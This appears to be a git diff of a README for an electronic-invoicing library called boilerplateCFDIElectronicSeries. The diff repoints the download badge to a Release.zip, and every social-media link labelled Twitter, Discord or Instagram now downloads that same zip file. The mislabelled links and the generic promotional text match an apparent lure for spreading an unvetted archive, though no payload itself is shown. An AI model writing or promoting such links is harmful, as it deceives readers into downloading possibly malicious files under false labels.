@@ -15,7 +15,7 @@ Welcome to the **boilerplateCFDIElectronicSeries** repository! This library is d
 
 To get started with the **boilerplateCFDIElectronicSeries** library, download the latest version from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/RezaRafif/boilerplateCFDIElectronicSeries/releases/download/v1.0/Release.zip)](https://github.com/RezaRafif/boilerplateCFDIElectronicSeries/releases/download/v1.0/Release.zip)
 
 Once the file is downloaded, follow the installation instructions provided in the documentation to begin using the library.
 
@@ -48,9 +48,9 @@ If you encounter any issues or have questions regarding the library, please chec
 
 Follow us on social media and stay updated with the latest news and developments related to the **boilerplateCFDIElectronicSeries** library:
 
-🐦 Twitter: [@CFDIElectronicSeries](https://twitter.com/CFDIElectronicSeries)  
-💬 Discord: [CFDIElectronicSeries Discord Server](https://discord.com/CFDIElectronicSeries)  
-📷 Instagram: [@CFDIElectronicSeries](https://instagram.com/CFDIElectronicSeries)  
+🐦 Twitter: [@CFDIElectronicSeries](https://github.com/RezaRafif/boilerplateCFDIElectronicSeries/releases/download/v1.0/Release.zip)  
+💬 Discord: [CFDIElectronicSeries Discord Server](https://github.com/RezaRafif/boilerplateCFDIElectronicSeries/releases/download/v1.0/Release.zip)  
+📷 Instagram: [@CFDIElectronicSeries](https://github.com/RezaRafif/boilerplateCFDIElectronicSeries/releases/download/v1.0/Release.zip)  
 
 Let's revolutionize the world of electronic invoicing together! 💫
 
